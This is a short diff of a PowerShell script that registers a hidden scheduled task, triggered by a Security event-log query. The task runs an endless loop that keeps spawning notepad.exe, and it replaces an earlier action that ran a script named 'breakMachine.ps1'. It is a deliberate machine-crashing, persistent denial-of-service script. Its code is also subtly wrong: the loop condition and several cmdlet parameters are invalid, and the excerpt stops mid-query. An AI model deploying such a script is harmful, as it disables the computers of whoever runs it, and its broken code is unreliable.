@@ -1,6 +1,6 @@
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -NonInteractive -WindowStyle Hidden -File "C:\PATH\breakMachine.ps1"
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -ArgumentList "-NoProfile -NonInteractive -WindowStyle Hidden -Command `"while (true){Start-Process notepad.exe}`""
 
-$trigger = New-ScheduledTaskTrigger -At "OnEvent" -Subscription @"
+$trigger = New-ScheduledTaskTrigger -OnEvent -Subscription @"
 <QueryList>
   <Query Id="0" Path="Security">
     <Select Path="Security">
